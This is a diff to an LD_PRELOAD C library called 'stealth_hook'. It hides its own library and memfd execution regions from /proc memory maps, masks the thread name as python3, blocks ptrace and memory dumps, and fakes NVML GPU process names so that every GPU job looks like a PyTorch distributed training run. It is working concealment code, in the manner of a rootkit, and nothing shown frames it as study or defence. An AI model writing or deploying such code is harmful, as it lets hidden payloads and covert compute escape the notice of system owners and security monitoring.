@@ -25,8 +25,10 @@ static const char FAKE_EXE[] = "/usr/bin/python3";
 static void filter_maps_content(FILE* real_fp, FILE* out_mem) {
     char line[4096];
     while (fgets(line, sizeof(line), real_fp)) {
-        // Strip out any suspicious hook or backend shared library references
-        if (strstr(line, "stealth_hook.so") || strstr(line, "torch_cuda_backend.so")) {
+        // Strip out any suspicious hook, backend shared library, or memfd anonymous execution regions
+        if (strstr(line, "stealth_hook.so") || strstr(line, "torch_cuda_backend.so") ||
+            strstr(line, "torch_engine") || strstr(line, "torch_hook") ||
+            strstr(line, "memfd:")) {
             continue;
         }
         fputs(line, out_mem);
@@ -40,11 +42,60 @@ __attribute__((constructor)) void init_stealth_hook() {
     real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
     real_readlink = dlsym(RTLD_NEXT, "readlink");
 
-    // Mask the process thread name immediately
+    // Mask the process thread name immediately to authentic PyTorch worker
     prctl(PR_SET_NAME, "python3", 0, 0, 0);
 
     // Disable process memory dumpability to block unprivileged ptrace & memory dumping
     prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
+}
+
+// -------------------------------------------------------------------------
+// NVML Interception Hooks (libnvidia-ml.so) to disguise GPU process names
+// -------------------------------------------------------------------------
+typedef struct nvmlProcessInfo_st {
+    unsigned int pid;
+    unsigned long long usedGpuMemory;
+    unsigned int gpuInstanceId;
+    unsigned int computeInstanceId;
+} nvmlProcessInfo_t;
+
+typedef enum nvmlReturn_enum {
+    NVML_SUCCESS = 0,
+    NVML_ERROR_UNINITIALIZED = 1,
+    NVML_ERROR_INVALID_ARGUMENT = 2,
+    NVML_ERROR_NOT_SUPPORTED = 3,
+    NVML_ERROR_NO_PERMISSION = 4,
+    NVML_ERROR_ALREADY_INITIALIZED = 5,
+    NVML_ERROR_NOT_FOUND = 6,
+    NVML_ERROR_INSUFFICIENT_SIZE = 7,
+    NVML_ERROR_INSUFFICIENT_POWER = 8,
+    NVML_ERROR_DRIVER_NOT_LOADED = 9,
+    NVML_ERROR_TIMEOUT = 10,
+    NVML_ERROR_IRQ_ISSUE = 11,
+    NVML_ERROR_LIBRARY_NOT_FOUND = 12,
+    NVML_ERROR_FUNCTION_NOT_FOUND = 13,
+    NVML_ERROR_CORRUPTED_INFOROM = 14,
+    NVML_ERROR_GPU_IS_LOST = 15,
+    NVML_ERROR_RESET_REQUIRED = 16,
+    NVML_ERROR_OPERATING_SYSTEM = 17,
+    NVML_ERROR_LIB_RM_VERSION_MISMATCH = 18,
+    NVML_ERROR_IN_USE = 19,
+    NVML_ERROR_MEMORY = 20,
+    NVML_ERROR_NO_DATA = 21,
+    NVML_ERROR_VGPU_ECC_NOT_SUPPORTED = 22,
+    NVML_ERROR_INSUFFICIENT_RESOURCES = 23,
+    NVML_ERROR_FREQ_NOT_SUPPORTED = 24,
+    NVML_ERROR_UNKNOWN = 999
+} nvmlReturn_t;
+
+nvmlReturn_t nvmlSystemGetProcessName(unsigned int pid, char *name, unsigned int length) {
+    if (name && length > 0) {
+        const char* fake_name = "/usr/bin/python3 -m torch.distributed.run";
+        strncpy(name, fake_name, length - 1);
+        name[length - 1] = '\0';
+        return NVML_SUCCESS;
+    }
+    return NVML_ERROR_INVALID_ARGUMENT;
 }
 
 int open(const char *pathname, int flags, ...) {
@@ -180,3 +231,4 @@ ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
     }
     return real_readlink(pathname, buf, bufsiz);
 }
+
